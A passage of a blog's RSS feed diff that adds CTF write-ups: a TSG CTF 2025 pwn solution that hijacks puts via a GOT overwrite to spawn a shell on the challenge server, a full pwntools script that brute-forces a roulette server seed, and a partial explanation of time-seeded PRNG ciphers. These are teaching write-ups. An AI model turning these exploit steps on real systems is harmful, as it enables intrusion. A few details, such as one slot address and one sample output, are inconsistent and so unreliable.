@@ -4,9 +4,241 @@
         <description><![CDATA[Markel's blog, mainly focused on Computer Science but also about other topics.]]></description>
         <link>https://markelmencia.github.io</link>
         <generator>RSS for Node</generator>
-        <lastBuildDate>Thu, 18 Dec 2025 16:45:01 GMT</lastBuildDate>
+        <lastBuildDate>Sun, 21 Dec 2025 10:45:30 GMT</lastBuildDate>
         <atom:link href="https://markelmencia.github.io/rss.xml" rel="self" type="application/rss+xml"/>
         <language><![CDATA[en]]></language>
+        <item>
+            <title><![CDATA[TSG CTF 2025 Writeup: global_writer [Pwn]]]></title>
+            <description><![CDATA[<h1>TSG CTF 2025 Writeup: global_writer [Pwn]</h1>
+<h4>December 5, 2025</h4>
+<p>This is a Pwn challenge for the TSG 2025 CTF, made by shashiming. The description for it is: "Just make 'em all global. Way easier.".</p>
+<h2>The source code</h2>
+<p>For this challenge, other than the binary and a Dockerfile to run the server, we are given the source of the binary. Let's take a look at it</p>
+<pre><code class="language-c">// gcc -no-pie -Wl,-z,relro -fstack-protector-all -o chal src.c
+
+#include &#x3C;stdio.h>
+#include &#x3C;stdlib.h>
+#define SIZE 0x10
+
+char *msg = "Update Complete";
+int values[SIZE];
+int idx, i;
+
+void handle_error() {
+  system("echo ERROR OCCURRED");
+  exit(1);
+}
+
+void edit() {
+  while (1) {
+    printf("index? > ");
+    if (scanf("%d", &#x26;idx) != 1) {
+      handle_error();
+    }
+    if (idx == -1) {
+      break;
+    }
+    printf("value? > ");
+    if (scanf("%d", &#x26;values[idx]) != 1) {
+      handle_error();
+    }
+  }
+
+  puts(msg);
+  printf("Array: ");
+  for (i = 0; i &#x3C; SIZE; i++) {
+    printf("%d ", values[i]);
+  }
+  printf("\n");
+}
+
+int main() {
+  setbuf(stdin, NULL);
+  setbuf(stdout, NULL);
+  setbuf(stderr, NULL);
+  edit();
+  return 0;
+}
+</code></pre>
+<p>Taking a look at <code>edit()</code>, the function that allows us to input data, we can see how we'll have to give an index and then the value that will be stored in that index of the array <code>values</code>.  We'll be able to store data to this array until we select index -1.</p>
+<p>Interestingly though, <code>values</code> is not a local variable, it's a <strong>global variable</strong>. This moves stack overflows out of the question, as the array indexes are going to be <strong>in memory.</strong> This is why the author of this challenge hinted global variables in the description.</p>
+<p>Since we'll be writing somewhere in memory (to hopefully overflow it), it'd make sense to check where exactly the array is located, and see what's around it. To inspect the binary, I'll be using <code>pwndbg</code>.</p>
+<h2>Looking around</h2>
+<p>Since the array is a global variable, we can easily check its address with <code>info variables</code>:</p>
+<pre><code>pwndbg> info variables
+...
+0x00000000004040c0  values
+...
+</code></pre>
+<p>Before inspecting the address region, I'll run the program and add a breakpoint on startup, just so we allow the program to load its variables and memory regions.</p>
+<pre><code>pwngdb> break main
+Breakpoint 1 at 0x4013b1
+pwndbg> run
+</code></pre>
+<p>Now, let's see what's next to the <code>values</code> address:</p>
+<pre><code>pwndbg> x/32gx 0x4040c0
+0x4040c0 &#x3C;values>:	0x0000000000000000	0x0000000000000000
+0x4040d0 &#x3C;values+16>:	0x0000000000000000	0x0000000000000000
+0x4040e0 &#x3C;values+32>:	0x0000000000000000	0x0000000000000000
+0x4040f0 &#x3C;values+48>:	0x0000000000000000	0x0000000000000000
+0x404100 &#x3C;idx>:	0x0000000000000000	0x0000000000000000
+0x404110:	0x0000000000000000	0x0000000000000000
+0x404120:	0x0000000000000000	0x0000000000000000
+0x404130:	0x0000000000000000	0x0000000000000000
+0x404140:	0x0000000000000000	0x0000000000000000
+0x404150:	0x0000000000000000	0x0000000000000000
+0x404160:	0x0000000000000000	0x0000000000000000
+0x404170:	0x0000000000000000	0x0000000000000000
+0x404180:	0x0000000000000000	0x0000000000000000
+0x404190:	0x0000000000000000	0x0000000000000000
+0x4041a0:	0x0000000000000000	0x0000000000000000
+0x4041b0:	0x0000000000000000	0x0000000000000000
+</code></pre>
+<p>Nothing out of the ordinary. We can see the memory range of  <code>values</code>, empty for now, and after that we can see <code>idx</code>, a global variable defined after <code>values</code> in the source code. This is what's after <code>values</code>, let's see what's before it. For that, I'll just plug in a lower address, like <code>0x404000</code>:</p>
+<pre><code>pwndbg> x/32gx 0x404000
+0x404000:	0x0000000000403e20	0x00007ffff7ffe310
+0x404010:	0x00007ffff7fd9610	0x0000000000401030
+0x404020 &#x3C;puts@got.plt>:	0x0000000000401040	0x0000000000401050
+0x404030 &#x3C;setbuf@got.plt>:	0x0000000000401060	0x0000000000401070
+0x404040 &#x3C;printf@got.plt>:	0x0000000000401080	0x0000000000401090
+0x404050 &#x3C;exit@got.plt>:	0x00000000004010a0	0x0000000000000000
+0x404060:	0x0000000000000000	0x0000000000402004
+0x404070:	0x0000000000000000	0x0000000000000000
+0x404080 &#x3C;stdout@GLIBC_2.2.5>:	0x00007ffff7f9e5c0	0x0000000000000000
+0x404090 &#x3C;stdin@GLIBC_2.2.5>:	0x00007ffff7f9d8e0	0x0000000000000000
+0x4040a0 &#x3C;stderr@GLIBC_2.2.5>:	0x00007ffff7f9e4e0	0x0000000000000000
+0x4040b0:	0x0000000000000000	0x0000000000000000
+0x4040c0 &#x3C;values>:	0x0000000000000000	0x0000000000000000
+0x4040d0 &#x3C;values+16>:	0x0000000000000000	0x0000000000000000
+0x4040e0 &#x3C;values+32>:	0x0000000000000000	0x0000000000000000
+0x4040f0 &#x3C;values+48>:	0x0000000000000000	0x0000000000000000
+</code></pre>
+<p>Nice.</p>
+<p>Someone that has worked with dynamic linking attacks would be devilishly rubbing its hands right now. The <strong>PLT table</strong> is located very close to <code>values</code>.  Reading about <strong>PLT/GOT</strong> is highly advised if you haven't already, I highly recommend <a href="https://can-ozkan.medium.com/got-vs-plt-in-binary-analysis-888770f9cc5a">this article</a> to understand the basics; but essentially, we can overwrite the pointers to the functions in the PLT to make them <strong>execute a different function</strong>. In the source code, in <code>handle_error()</code>, we can notice a <code>system()</code> function. What would happen if we overwrote the pointer of <code>puts()</code>, so that instead of linking the PLT to <code>puts()</code> it linked to <code>system()</code>? This would make it so that for every <code>puts()</code> called in the code, instead of executing the <code>puts()</code> code, it would execute the <code>system()</code> code, potentially granting us access to <strong>arbitrary code execution</strong> in the machine.</p>
+<h2>Function arguments</h2>
+<p>Granted, that wouldn't be enough, because both <code>puts()</code> and <code>system()</code> have their own string arguments ("Update Complete" and "echo ERROR OCCURRED" respectively, looking at the source code). This means that even if we do manage to run <code>system()</code> for every <code>puts()</code> call, the argument would be "Update Complete". That would naturally raise an error, because it's not a valid command. Thus, we'll have to find a workaround for that.</p>
+<p>We're in luck, because the string <code>msg</code>, which is the string used as the argument in <code>puts()</code> (which will later become <code>system()</code>) is actually a <strong>global variable</strong> too, and its address is even closer to the array <code>values</code>:</p>
+<pre><code>pwndbg> p &#x26;msg
+$1 = (&#x3C;data variable, no debug info> *) 0x404068 &#x3C;msg>
+</code></pre>
+<p>In C, a string is a pointer, and this is no exception. The value in the memory address <code>0x404068</code> will be <strong>another address</strong>, that will actually contain the content of the string: its characters. So, if we overwrite the value of <code>msg</code> so that we write an address we can write whatever string we want to, we'll be able to <strong>modify the string</strong>. And in what addresses can we write on with seemingly no limitations? In <code>values</code> of course, with the use of the function <code>edit()</code> of the binary!</p>
+<h2>Overwriting global variables</h2>
+<p>In order to overwrite <code>msg</code>, considering it's behind <code>values</code> in memory, we'll need to write in a negative of <code>values</code>. To calculate in which, we can do <code>x/32gx &#x26;msg</code> and start counting down for every 4 bytes from <code>values</code> until the address of <code>msg</code>. We get  -22. So, to overwrite <code>msg</code>, we'll have to write in the index -22 of <code>values</code>. What do we want to write there? Well, any address inside <code>values</code> works, I'll use the first one, <code>0x4040c0</code>. In this address, I'll have to write whatever I want the argument of <code>system()</code> to be. Since we want full control of the system, we can write <code>/bin/sh</code> in there. With this argument in <code>system()</code>, a shell will be opened, so that later we can <code>cat</code> into the flag.</p>
+<p>That's the first step done! Let's write this down for now:</p>
+<pre><code>1. Write in index -22 the value 0x4040c0
+2. Write in index 0 (address 0x4040c0) the string "/bin/sh"
+</code></pre>
+<p>Actually, there's a small issue with this. <code>values</code> is an array of <strong>integers</strong>, which means that each index has the capacity for <strong>4 bytes</strong>, four characters in total. This makes us have to split the string in two. In the first index we'll write "/bin", and in the next one we'll write "/sh".</p>
+<pre><code>1. Write in index -22 the value 0x4040c0
+2. Write in index 0 (address 0x4040c0) the string "/bin"
+3. Write in index 1 (address 0x4040c1) the string "/sh"
+</code></pre>
+<p>Let's turn the strings into its ASCII hexadecimal equivalents:</p>
+<pre><code>1. Write in index -22 the value 0x4040c0
+2. Write in index 0 (address 0x4040c0) the value 0x6E69622F
+3. Write in index 1 (address 0x4040c1) the value 0x68732F
+</code></pre>
+<h2>The dynamic link attack</h2>
+<p>Now let's do the fun part. We've changed <code>msg</code> so that the argument that <code>put()</code> receives is <code>/bin/sh</code>, a valid command. Now we just need to make <code>put()</code> actually call <code>system()</code>, as we've said before. First, let's see where <code>system()</code> is located.</p>
+<p>The PLT (Procedure Linkage Table) is used to perform a technique called "<strong>Lazy Linking</strong>", where a function is only linked to the binary when it's needed. In order to know its address, the PLT communicates with the GOT (Global Offset Table), which knows the address of these functions. To check the GOT, we can execute the <code>got</code> command:</p>
+<pre><code>pwndbg> got
+...
+[0x404030] setbuf@GLIBC_2.2.5 -> 0x7ffff7e3d920 (setbuf) ◂— mov edx, 0x2000
+[0x404038] system@GLIBC_2.2.5 -> 0x401070 ◂— endbr64 
+[0x404040] printf@GLIBC_2.2.5 -> 0x7ffff7e0f900 (printf) ◂— sub rsp, 0xd8
+...
+</code></pre>
+<p>There's <code>system()</code>, with its address (0x401070). With that out of the way, we can start focusing on the overwrite.</p>
+<pre><code>0x404000:	0x0000000000403e20	0x00007ffff7ffe310
+0x404010:	0x00007ffff7fd9610	0x0000000000401030
+0x404020 &#x3C;puts@got.plt>:	0x0000000000401040	0x0000000000401050
+0x404030 &#x3C;setbuf@got.plt>:	0x0000000000401060	0x0000000000401070
+0x404040 &#x3C;printf@got.plt>:	0x0000000000401080	0x0000000000401090
+0x404050 &#x3C;exit@got.plt>:	0x00000000004010a0	0x0000000000000000
+0x404060:	0x0000000000000000	0x0000000000402004
+0x404070:	0x0000000000000000	0x0000000000000000
+0x404080 &#x3C;stdout@GLIBC_2.2.5>:	0x00007ffff7f9e5c0	0x0000000000000000
+0x404090 &#x3C;stdin@GLIBC_2.2.5>:	0x00007ffff7f9d8e0	0x0000000000000000
+0x4040a0 &#x3C;stderr@GLIBC_2.2.5>:	0x00007ffff7f9e4e0	0x0000000000000000
+0x4040b0:	0x0000000000000000	0x0000000000000000
+0x4040c0 &#x3C;values>:	0x0000000000000000	0x0000000000000000
+0x4040d0 &#x3C;values+16>:	0x0000000000000000	0x0000000000000000
+0x4040e0 &#x3C;values+32>:	0x0000000000000000	0x0000000000000000
+0x4040f0 &#x3C;values+48>:	0x0000000000000000	0x0000000000000000
+</code></pre>
+<p>Looking at the PLT and <code>values</code>, yet again we need to calculate the index we'll need to write on to overwrite exactly the address in <code>puts()</code>. Using the same trick as before (and maybe some trial and error on the way), we get -40 as the index. In that address, we'll write the already known <code>system()</code> address. Let's note this down:</p>
+<pre><code>3. Write in index -40 the system() address (0x401070)
+</code></pre>
+<h2>Performing the exploit</h2>
+<p>We now have everything we need to perform the exploit. Let's take a look at the list we've written:</p>
+<pre><code>1. Write in index -22 the value 0x4040c0
+2. Write in index 0 (address 0x4040c0) the value 0x6E69622F
+3. Write in index 1 (address 0x4040c1) the value 0x68732F
+</code></pre>
+<p>Normally, payloads like these are automated with a Python script with <code>pwntools</code>. I'll write them in manually, which is also not that difficult, and I think it's a more visual approach for a writeup. However, since the values taken by the <code>edit()</code> function are <strong>decimal integers</strong>, we'll need to translate our hexadecimal addresses to decimal:</p>
+<pre><code>1. Write in index -22 the value 4210880
+2. Write in index 0 (address 4210880) the value 1852400175
+3. Write in index 1 (address 4210881) the value 6845231
+4. Write in index -40 the system() address (4198512)
+</code></pre>
+<p>Now we just need to connect to the server and see if what we've done is correct:</p>
+<pre><code>$ nc 34.84.25.24 58554
+index? > -22
+value? > 4210880
+index? > 0
+value? > 1852400175
+index? > 1
+value? > 6845231
+index? > -40
+value? > 4198512
+index? >
+</code></pre>
+<p>Everything is set up now. All we need is to somehow execute <code>system()</code>.</p>
+<pre><code>void edit() {
+  while (1) {
+    printf("index? > ");
+    if (scanf("%d", &#x26;idx) != 1) {
+      handle_error();
+    }
+    if (idx == -1) {
+      break;
+    }
+    printf("value? > ");
+    if (scanf("%d", &#x26;values[idx]) != 1) {
+      handle_error();
+    }
+  }
+
+  puts(msg);
+  printf("Array: ");
+  for (i = 0; i &#x3C; SIZE; i++) {
+    printf("%d ", values[i]);
+  }
+  printf("\n");
+}
+</code></pre>
+<p>Looking at the code, and the fact that we've replaced the <code>puts()</code> call with the <code>system()</code> code, including its argument, all we need to do is get to a <code>puts()</code> call. In order to get to it, we just need to break the <code>while</code> loop by selecting the index -1 next:</p>
+<pre><code>index? > -1
+
+</code></pre>
+<p>Nothing showed up! This is actually great news, because <strong>the shell has opened</strong>. We have full control over the machine, so let's give ourselves the freedom of seeing what's on it:</p>
+<pre><code>ls
+chal
+flag-5f58d5916588b60b33a904537af3a564.txt
+start.sh
+</code></pre>
+<p>After running <code>ls</code> we can see that the flag is right there. With the use of a wildcard to avoid having to write in all those numbers, we can <code>cat</code> into the flag:</p>
+<pre><code>cat f*
+TSGCTF{6O7_4nd_6lob4l_v4r1able5_ar3_4dj4c3n7_1n_m3m0ry_67216011}
+</code></pre>
+<p>That's it!</p>
+<h2>Conclusion</h2>
+<p>The key of this challenge was that global variables tend to be close to the PLT/GOT region of our binary. If the binary isn't properly protected, nothing stops us from modifying the values of our global variables or PLT entries. This is where the vulnerability lied. By overwriting certain entries and creating our own argument in <code>msg</code> to open a shell, we've managed to turn a seemingly harmless function into one that granted us access to the server.</p>
+]]></description>
+            <link>https://markelmencia.github.io/writeups/tsgctf2025-global-writer-writeup</link>
+            <guid isPermaLink="true">https://markelmencia.github.io/writeups/tsgctf2025-global-writer-writeup</guid>
+            <pubDate>Sun, 21 Dec 2025 00:00:00 GMT</pubDate>
+        </item>
         <item>
             <title><![CDATA[How to perform a simple buffer overflow]]></title>
             <description><![CDATA[<h1>How to perform a simple buffer overflow</h1>
@@ -282,6 +514,507 @@ $
             <link>https://markelmencia.github.io/blog/front-end-nightmare</link>
             <guid isPermaLink="true">https://markelmencia.github.io/blog/front-end-nightmare</guid>
             <pubDate>Fri, 05 Dec 2025 00:00:00 GMT</pubDate>
+        </item>
+        <item>
+            <title><![CDATA[Break The Syntax 2025: crypto/Roulette]]></title>
+            <description><![CDATA[<h1>Break The Syntax CTF 2025: crypto/roulette</h1>
+<h2>Overview</h2>
+<p>This challenge simulates a "Provably Fair Roulette". In order to interact with the challenge we have to connect to the server that runs it. To get the flag, according to the given description, <strong>we must get the number 13 a total of 37 times in a row</strong>. To do so, we are given the code that runs in the server.</p>
+<h2>Objective</h2>
+<p>Somehow manipulate our interaction with the server to <strong>hardcode the number 13 as the resulting number</strong> of the roulette.</p>
+<h2>Writeup</h2>
+<h3>The server</h3>
+<p>Let's look at the <strong>Python script</strong> that runs in the server, to see how the winner number is generated:</p>
+<pre><code>from hashlib import sha256
+import secrets
+
+
+def get_color(number):
+    """Determine roulette color for a given number"""
+    if number == 0:
+        return 'green'
+    return 'red' if number % 2 == 1 else 'black'
+
+def main():
+    print("Welcome to Provably Fair Roulette!")
+    
+    with open('flag', 'rt') as f:
+        FLAG = f.read()
+        
+    streak_13 = 0
+    while True:
+        # Generate server seed and its hash
+        server_seed = sha256(bytes(secrets.randbits(17))).hexdigest()
+        server_seed_hash = sha256(server_seed.encode()).hexdigest()
+        
+	    print(f"Server seed hash (verify later): {server_seed_hash}")
+        # Get client seed
+        print("Enter your client seed (press enter to generate): ", end="")
+        client_seed = input().strip()
+        if not client_seed:
+            client_seed = secrets.token_bytes(8).hex()
+            print(f"Generated client seed: {client_seed}")
+            
+        # Generate game hash
+        combined = f"{server_seed}:{client_seed}"
+        game_hash = sha256(combined.encode()).hexdigest()
+        hash_int = int(game_hash, 16)
+        
+        # Calculate roulette result
+        roulette_number = hash_int % 37  # 0-36
+        roulette_color = get_color(roulette_number)
+		
+	    # Get user's bet
+        while True:
+            print("Place your bet (number 0-36 or color red/black/green): ", end="")
+            bet = input().strip().lower()
+            if bet in ['green', 'red', 'black']:
+                break
+            try:
+                num = int(bet)
+                if 0 &#x3C;= num &#x3C;= 36:
+                    bet = str(num)  # Standardize to string for comparison
+                    break
+                print("Number must be between 0-36")
+            except ValueError:
+                print("Invalid bet. Enter number (0-36) or color (red/black/green)"
+        
+        # Determine result
+        result_str = f"{roulette_number} ({roulette_color})"
+        print(f"\nThe wheel lands on: {result_str}")
+        
+        # Check win conditions
+        win = False
+        if bet.isdigit():
+            win = int(bet) == roulette_number
+        else:
+            win = bet == roulette_color
+		   
+        if win:
+            print("Congratulations! You win! ")
+            if roulette_number == 13:
+                print("...and you got 13, double congratulations!")
+                streak_13 += 1
+            else:
+                print("But it's not 13, no streak for you")
+                streak_13 = 0
+        else:
+            print("Sorry, you lose!")
+            streak_13 = 0
+	    
+		# Verification information
+        print()
+        print("Verification Details:")
+        print(f"Server seed: {server_seed}")
+        print(f"Client seed: {client_seed}")
+        print(f"Combined string: {combined}")
+        print(f"Game hash: {game_hash}")
+        print(f"Calculated number: {roulette_number}")
+        print(f"Resulting color: {roulette_color}")
+
+        if streak_13 == 37:
+            print("How? How is it possible? What was the chance?! " f"Anyway, here's your flag, congratulations... {FLAG}")
+            exit()
+
+if __name__ == "__main__":
+    main()
+</code></pre>
+<p>First it generates a server seed, which is just <strong>a random 17-bit long hexadecimal number</strong>. Then it hashes it, it prints it out to us:</p>
+<pre><code># Generate server seed and its hash
+server_seed = sha256(bytes(secrets.randbits(17))).hexdigest()
+server_seed_hash = sha256(server_seed.encode()).hexdigest()
+
+print(f"Server seed hash (verify later): {server_seed_hash}")
+</code></pre>
+<p>Then the server asks us for input. This will be our seed:</p>
+<pre><code># Get client seed
+print("Enter your client seed (press enter to generate): ", end="")
+client_seed = input().strip()
+if not client_seed:
+    client_seed = secrets.token_bytes(8).hex()
+    print(f"Generated client seed: {client_seed}")
+</code></pre>
+<p>Here's the important part: in order to calculate the roulette number, the server seed gets <strong>concatenated</strong> with our seed and then it's turned into a hash. The hash is parsed into an integer, and once we calculate its module with 37, it will generate a number between 0 and 36, just like in a roulette. The color is also calculated, but we can overlook that as it doesn't help us get the flag:</p>
+<pre><code class="language-python"># Generate game hash
+combined = f"{server_seed}:{client_seed}"
+game_hash = sha256(combined.encode()).hexdigest()
+hash_int = int(game_hash, 16)
+        
+# Calculate roulette result
+roulette_number = hash_int % 37  # 0-36
+roulette_color = get_color(roulette_number)
+</code></pre>
+<h3>How it generates the number</h3>
+<p>As we've seen, the server will generate a seed and will asks us for another one. Then, it will combine both seeds to generate a random number between 0 and 36. This is pretty much how the server gets the number.</p>
+<h3>What do we know?</h3>
+<p>We have a decent amount of data of how the server operates. We know:</p>
+<ul>
+<li>How the server <strong>generates the winning number</strong></li>
+<li>Our <strong>client seed</strong> (since we give it to the server)</li>
+<li>The <strong>hashed server seed</strong>.</li>
+<li>The fact that the <strong>server seed</strong> is a random number of a <strong>fixed size</strong> (17 bits).</li>
+</ul>
+<p>Smell something fishy? With this data we have everything we need to get the flag, let's see how!</p>
+<h3>The vulnerability</h3>
+<p>Considering that the server allows us to introduce our own seed, all we need to do is provide one that <strong>we know</strong> will generate a 13. But how do we know if a client seed will generate a 13? Let's go back to the server script:</p>
+<pre><code># Generate game hash
+combined = f"{server_seed}:{client_seed}"
+game_hash = sha256(combined.encode()).hexdigest()
+hash_int = int(game_hash, 16)
+
+# Calculate roulette result
+roulette_number = hash_int % 37  # 0-36
+roulette_color = get_color(roulette_number)
+</code></pre>
+<p>The way the number is generated is by <strong>combining the server and client seed</strong>. This means that if we knew the server seed, we could just <strong>bruteforce</strong> a winning client seed by generating a random client seed, concatenate it with the server seed, and calculating the number it would generate, until we find a seed that does indeed generate a 13. There's a slight issue though, <strong>we don't know the server seed</strong>. Or do we?</p>
+<p>The server gives us it server seed hashed. However, we know that the length of the seed is 17 bits, so there's nothing stopping us from bruteforcing the server seed! All we need to do is to <strong>iterate through every number between 0 and 2¹⁷, generate its hash</strong>, and check if that hash is equal to the server hash the server has given us. That way, we'd get the <strong>seed number</strong>:</p>
+<pre><code>def get_server_seed(server_seed_hash):
+	i = 0
+	for i in range(int(math.pow(2, 17))):
+		potential_server_seed = sha256(bytes(i)).hexdigest()
+		potential_server_seed_hash = sha256(potential_server_seed.encode()).hexdigest()
+		if potential_server_seed_hash == server_seed_hash:
+			break
+	
+	server_seed = sha256(bytes(i)).hexdigest()
+	return server_seed
+</code></pre>
+<p>With this snippet, we can do just that.</p>
+<p>By the way, I use <strong>pwntools</strong> to interact with the server and get the server seed (and later introduce my client seed). Considering that the winner flow of the output of the server is like this:</p>
+<pre><code>Welcome to Provably Fair Roulette!
+Server seed hash (verify later): &#x3C;random hash>
+Enter your client seed (press enter to generate): &#x3C;winner hash>
+Place your bet (number 0-36 or color red/black/green): 13
+
+The wheel lands on: 13 (red)
+Congratulations! You win!
+...and you got 13, double congratulations!
+
+Verification Details:
+Server seed: &#x3C;random hash>
+Client seed: &#x3C;winner hash>
+Combined string: &#x3C;random hash>:&#x3C;winner hash>
+Calculated number: 13
+Resulting color: red
+</code></pre>
+<p>Here's how you can split the output to store the hashed server seed in a variable:</p>
+<pre><code>conn = remote('localhost',8081) # The port my server was running on
+# The challenge requires us to get the number 13 a total of 37 times in a row
+for o in range(37):
+	conn.recvline() # "Welcome to Provably Fair Roulette!"
+	response = conn.recvline().decode().strip() # This line contains the hash
+	server_hash = response.split()[5]
+	
+	print(f"Server hash: {server_hash}")
+	
+	# *Now* we get the server seed
+	server_seed = get_server_seed(server_hash)
+</code></pre>
+<p>Now we have the server seed, which was the last piece we needed to be able to <strong>bruteforce a client seed that always generates the number 13</strong> on the roulette. Let's see how we can bruteforce the seed:</p>
+<pre><code>def get_winner_client_seed(server_seed):
+	client_seed = ""
+	while True:
+		# Randomly generate a seed
+		client_seed = secrets.token_bytes(8).hex()
+		# Combine it with the server seed
+		combined = f"{server_seed}:{client_seed}"
+		# Get the game hash with the combined seed
+		game_hash = sha256(combined.encode()).hexdigest()
+		hash_int = int(game_hash, 16)
+		# Check if the roulette number of the hash is 13
+		roulette_number = hash_int % 37 # 0-36
+		if roulette_number == 13:
+			break
+	
+	return client_seed
+</code></pre>
+<p>This generates a winner seed that, together with the server seed, will always generate the number 13. That's all the technicality of the challenge! Now we just need to complete the <strong>pwntools</strong> script to interact properly with the server.</p>
+<p>First we generate the <strong>winner seed</strong> on the script, and then we use it as input:</p>
+<pre><code># Gets a winner seed
+winner_seed = get_winner_client_seed(server_seed)
+print("Winner seed obtained")
+
+# We wait a second because there's no delimiter because the server is now asking for input
+# (There likely is a much better way to do this)
+conn.recv(timeout=1)
+# We send our winner seed as input
+conn.sendline(winner_seed.encode())
+</code></pre>
+<p>Then the server will ask us which number do we think we'll be the winner. Since we know it will be 13, and that's the number we need to get 37 times in a row, we say it will be 13:</p>
+<pre><code>conn.recv(timeout=1)
+conn.sendline("13".encode())
+</code></pre>
+<p>By this point we've guessed correctly. To check that we did, we print the next two lines we receive from the server, and skip over the rest:</p>
+<pre><code>conn.recvline()
+# This will print that we indeed guessed right
+print(conn.recvline())
+print(conn.recvline())
+# We skip over unnecessary information
+for _ in range(8):
+	conn.recvline()
+</code></pre>
+<p>And that's it! Now we just need to do it <strong>37 more times</strong>. So, putting it all together:</p>
+<pre><code>from pwn import *
+from hashlib import *
+import secrets
+
+def get_winner_client_seed(server_seed):
+    client_seed = ""
+    while True:     
+        # Randomly generate a seed
+        client_seed = secrets.token_bytes(8).hex()
+        # Combine it with the server seed
+        combined = f"{server_seed}:{client_seed}"
+        # Get the game hash with the combined seed
+        game_hash = sha256(combined.encode()).hexdigest()
+        hash_int = int(game_hash, 16)
+        
+        # Check if the roulette number of the hash is 13
+        roulette_number = hash_int % 37  # 0-36
+        if roulette_number == 13:
+            break
+    
+    return client_seed
+
+
+def get_server_seed(server_seed_hash):
+    i = 0
+    for i in range(int(math.pow(2, 17))):
+        potential_server_seed = sha256(bytes(i)).hexdigest()
+        potential_server_seed_hash = sha256(potential_server_seed.encode()).hexdigest()
+        if potential_server_seed_hash == server_seed_hash:
+            break
+    
+    server_seed = sha256(bytes(i)).hexdigest()
+    return server_seed
+
+
+def main():
+    conn = remote('localhost',8081)
+    # The challenge requires us to get the number 13 a total of 37 times in a row
+    for o in range(37):
+		
+        conn.recvline()
+        response = conn.recvline().decode().strip() # This line contains the server hash
+        server_hash = response.split()[5]
+        print(f"Server hash: {server_hash}")
+        
+        # Gets the server seed
+        server_seed = get_server_seed(server_hash)
+        
+        # Gets a winner seed
+        winner_seed = get_winner_client_seed(server_seed)
+        print("Winner seed obtained")
+        
+        # We wait a second because there's no delimiter because the server is now asking for input
+        # (There likely is a much better way to do this)
+        conn.recv(timeout=1)
+        # We send our winner seed as input and guess that the number will be 13
+        conn.sendline(winner_seed.encode())
+        
+        conn.recv(timeout=1)
+        conn.sendline("13".encode())
+        
+        conn.recvline()
+        # This will print that we indeed guessed right
+        print(conn.recvline())
+        print(conn.recvline())
+        
+        # We skip over unnecessary information
+        for _ in range(8):    
+            conn.recvline()
+	
+	
+    # By this point we've guessed enough to get the flag
+    conn.recvline()
+    # Should print the flag
+    print(conn.recvline())
+    conn.close()
+
+
+if __name__ == "__main__":
+    main()
+</code></pre>
+<p>Notice how I print the flag after the loop.</p>
+<h2>Conclusion</h2>
+<p><strong>Bruteforcing</strong> is a very handy (and fun, in my opinion) tool that can help us obtain more data from data that we already have. Always keep an eye open for <strong>bruteforcing oportunities</strong> when you receive a hash!</p>
+]]></description>
+            <link>https://markelmencia.github.io/writeups/break-the-syntax-ctf-roulette-writeup</link>
+            <guid isPermaLink="true">https://markelmencia.github.io/writeups/break-the-syntax-ctf-roulette-writeup</guid>
+            <pubDate>Sat, 31 May 2025 00:00:00 GMT</pubDate>
+        </item>
+        <item>
+            <title><![CDATA[UMDCTF 2025: misc/find the seeds]]></title>
+            <description><![CDATA[<h1>UMDCTF 2025: misc/find the seeds</h1>
+<ul>
+<li><strong>Name:</strong> find the seeds</li>
+<li><strong>Description:</strong> can u help Alice find her seeds in the bin? She's pretty sure the bin hasn't been dumped since it was generated.</li>
+</ul>
+<h2>Overview</h2>
+<p>In this challenge, we are given two files: a <strong>binary</strong> file (secret.bin) and a <strong>Python script</strong> (secret.py). Let's quickly check the binary file with <code>xxd</code>, which will allow us to see the <strong>hexadecimal data</strong> of the file:</p>
+<pre><code>$ xxd secret.bin
+00000000: 1047 a8b7 cafc c837 fc9d 71b2 bf29 dd08  .G.....7..q..)..
+00000010: 2123 6106 3c0a ff1a f345 cedc 3d30 00e1  !#a.&#x3C;....E..=0..
+00000020: 372b                                     7+   
+</code></pre>
+<p>Judging by the small length of the file and the fact that there is no apparent binary header, we can come to the conclusion that this is a binary file with <strong>raw hexadecimal data</strong> which is not meant to be executed. The bytes of the file don't ressemble any ASCII string either, at least not directly.</p>
+<p>Let's open the <strong>Python script</strong> now:</p>
+<pre><code>import random
+import time
+
+seed = int(time.time())
+random.seed(seed)
+
+plaintext = b"UMDCTF{REDACTED}"
+keystream = bytes([random.getrandbits(8) for _ in range(len(plaintext))])
+ciphertext = bytes([p ^ k for p, k in zip(plaintext, keystream)])
+
+with open("secret.bin", "wb") as f:
+f.write(ciphertext)
+</code></pre>
+<p>At first glance, it looks like this script writes into the binary file we were given. Judging by the name of the variable <code>ciphertext</code>, it turns out that some <strong>ciphered text</strong> is written into the file.</p>
+<p>So all in all, it seems like the flag is hidden in <code>secret.bin</code> via some cipher algorithm performed in <code>secret.py</code>.</p>
+<h2>Objective</h2>
+<p>Our goal is to <strong>decipher the binary file</strong> to capture the flag, by finding the vulnerability in the script.</p>
+<h2>Writeup</h2>
+<h3>How does the flag get ciphered?</h3>
+<p>Let's break down the script:</p>
+<pre><code>import random
+import time
+
+# Generates a seed by using the current time
+seed = int(time.time())
+# Sets the generated seed to generate random numbers
+random.seed(seed)
+</code></pre>
+<p>At the beginning of the code, we can see how the script uses <strong>randomness</strong> to cipher the file, because it generates a <strong>seed</strong>.</p>
+<h3>What's a seed?</h3>
+<p>It's difficult to generate random numbers. Well, "true" random numbers at least. In order to generate an actual random number you need a completely unpredictable system, and getting one is easier said that done. The "chaotic" nature of some physical processes like <strong>radioactive decay or thermal noise</strong> are some of these systems that can be used to generate actual random numbers, and simulating those processes takes time and resources.</p>
+<p>Fortunately, conventional computers have an easy workaround: generating <strong>pseudo-random numbers</strong>. These numbers are not entirely random, but they <em>feel</em> random. Here's where seeds come into play.</p>
+<p>A seed is just a number, any number. It's the initial value of a sequence of random numbers. Going back to Python, we can set a seed and generate a bunch of numbers like this:</p>
+<pre><code>import random
+
+# We set the seed
+random.seed(42)
+# We print five random numbers from 1 to 100
+for _ in range(5):
+	print(random.randint(1, 100))
+</code></pre>
+<p>This will output:</p>
+<pre><code>82
+15
+4
+95
+36
+</code></pre>
+<p>The seed <code>42</code>'s first five pseudo-random numbers are 84, 15, 4, 95 and 36. Another seed, for example, <code>748349924</code>, has 64, 93, 35, 62 and 14 as the first numbers. Each seed has a <strong>different sequence</strong>, but this sequence does not change inside the scope of the algorithm you're using to generate random numbers. The seed <code>42</code> will <strong>always</strong> generate the same seemingly random sequence inside the algorithm you're using. Python's <code>random</code> library uses the <a href="https://es.wikipedia.org/wiki/Mersenne_twister">Mersenne Twister algorithm</a> in order to generate random numbers, as a matter of fact.</p>
